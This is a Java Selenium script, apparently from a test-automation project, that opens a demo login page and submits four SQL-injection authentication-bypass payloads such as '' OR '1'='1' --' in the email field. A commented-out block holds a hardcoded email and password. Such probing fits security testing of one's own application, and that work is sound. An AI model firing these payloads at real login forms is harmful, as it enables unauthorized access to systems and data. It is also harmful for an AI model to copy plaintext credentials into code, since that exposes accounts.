package Advaita_TDD.Advaita_TDD;

import java.util.ArrayList;
import java.util.List;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.support.ui.Select;

public class Demo {
//
////void navigate() {
//
//	public static void main(String[] args) {
//		WebDriver driver = new ChromeDriver();
//
//		driver.manage().window().maximize();
//
//		driver.get("https://demo-tras.getapcs.com/login");
//
//		driver.findElement(By.xpath("//input[@placeholder='Email']")).sendKeys("gopal@mail.com");
//		driver.findElement(By.xpath("//input[@placeholder='Password']")).sendKeys("gopal@123");
//
//		Select select = new Select(driver.findElement(By.xpath("/html/body/app-root/div/div/div/div/div/app-login/div/div/div[1]/form/div[3]/select")));
//
//		select.selectByVisibleText("Bangalore");
//
//		driver.findElement(By.xpath("//button/span")).click();
//
////	WebDriver driver = new EdgeDriver();
//	}
	
	 public static void main(String[] args) {

	        // Setup Selenium WebDriver (make sure to use the correct driver path)
//	        System.setProperty("webdriver.chrome.driver", "path/to/chromedriver");
	        WebDriver driver = new ChromeDriver();

	        // Navigate to the target application login page
	        driver.get("https://demo-tras.getapcs.com/login");

	        // SQL Injection payloads
	        List<String> sqlPayloads = new ArrayList<>();
	        sqlPayloads.add("' OR '1'='1' --");
	        sqlPayloads.add("' OR 'a'='a");
	        sqlPayloads.add("admin' --");
	        sqlPayloads.add("' OR 1=1 LIMIT 1; --");  // Another type

	        // Loop through each payload
	        for (String payload : sqlPayloads) {
	            try {
	                // Find the input fields (username and password)
	                WebElement usernameField = driver.findElement(By.xpath("//input[@placeholder='Email']"));  // Adjust locator as per your web app
	                WebElement passwordField = driver.findElement(By.xpath("//input[@placeholder='Password']"));  // Adjust locator as per your web app
	                WebElement select = driver.findElement(By.xpath("/html/body/app-root/div/div/div/div/div/app-login/div/div/div[1]/form/div[3]/select"));  // Adjust locator as per your web app
	                
//	                Select select1 = new Select(select);
//	                select1.selectByVisibleText("Bangalore");
//	                
	                // Enter the SQL injection payload
	                usernameField.clear();
	                usernameField.sendKeys(payload);
	                passwordField.clear();
	                passwordField.sendKeys("admin@123");  // Any value, or leave empty based on testing needs
	                
	                Select select1 = new Select(select);
	                select1.selectByVisibleText("Bangalore");
	                
	                // Submit the form
	                WebElement loginButton = driver.findElement(By.xpath("//button/span"));  // Adjust locator as per your web app
	                loginButton.click();
	                
	                // Check for results
	                System.out.println("Submitted SQL Injection Payload: " + payload);
	                // Add any verification for expected behavior here, like checking the URL or page content.

	            } catch (Exception e) {
	                e.printStackTrace();
	            }
	        }

	        // Close the browser after testing
//	        driver.quit();
	    }

}
